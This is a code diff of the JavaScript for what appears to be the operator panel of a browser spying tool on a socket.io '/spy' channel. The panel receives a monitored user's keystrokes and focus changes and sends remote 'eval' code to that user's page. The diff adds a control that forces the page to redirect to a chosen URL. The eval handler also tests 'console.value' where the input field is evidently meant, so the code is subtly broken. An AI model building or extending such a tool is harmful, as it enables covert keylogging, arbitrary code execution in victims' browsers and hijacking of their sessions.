@@ -36,27 +36,34 @@ elementChange = function (newElement) {
     if (lastElement !== newElement) {
         var message = 'User changed element to: <b>' + newElement + '</b>';
         chat.newLine(message);
-
         lastElement = newElement;
     }
 };
 
 
 const socket = io('/spy');
-
 socket.on('type', function (key) {
     chat.append(key);
 });
-
 socket.on('focus', function (focus) {
     elementChange(focus);
 });
 
+const redirectInput = document.getElementById('redirectUri');
+const redirectButton = document.getElementById('redirectButton');
+redirectButton.onclick = () => {
+    if (redirectInput.value !== '') {
+        socket.emit('redirect', redirectInput.value)
+        redirectInput.value = '';
+    }
+    return false;
+}
+
 
 const consoleInput = document.getElementById('console');
-const evalButton = document.getElementById('eval');
+const evalButton = document.getElementById('evalButton');
 
-evalButton.onclick = function () {
+evalButton.onclick = () => {
     if (console.value !== '') {
         socket.emit('eval', consoleInput.value);
         consoleInput.value = '';
